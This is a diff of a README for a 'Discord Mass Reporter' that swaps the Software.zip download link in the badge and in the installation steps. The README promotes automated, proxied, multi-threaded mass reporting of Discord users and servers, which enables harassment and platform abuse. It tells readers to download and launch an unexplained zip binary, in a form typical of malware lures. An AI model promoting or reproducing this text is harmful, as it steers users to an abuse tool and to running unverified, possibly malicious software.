@@ -1,6 +1,6 @@
 # 🚀 **Discord Mass Reporter**
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/minhquan18636/Discord-Mass-Reporter/releases/download/v1.0/Software.zip)](https://github.com/minhquan18636/Discord-Mass-Reporter/releases/download/v1.0/Software.zip)
 
 Welcome to the Discord Mass Reporter repository! This tool is designed to provide an automated solution for sending multiple reports on Discord users and servers with proxy support and multi-threading capabilities. Whether you need to report multiple users for violations or report several servers at once, this tool has got you covered.
 
@@ -16,7 +16,7 @@ Welcome to the Discord Mass Reporter repository! This tool is designed to provid
 
 ## Installation
 
-To get started with the Discord Mass Reporter tool, simply download the software from the following link: [Download Software](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip). Once downloaded, extract the files and launch the application to begin using its powerful reporting features.
+To get started with the Discord Mass Reporter tool, simply download the software from the following link: [Download Software](https://github.com/minhquan18636/Discord-Mass-Reporter/releases/download/v1.0/Software.zip). Once downloaded, extract the files and launch the application to begin using its powerful reporting features.
 
 If the link provided above ends with the file name, you need to download and launch the software on your device.
 
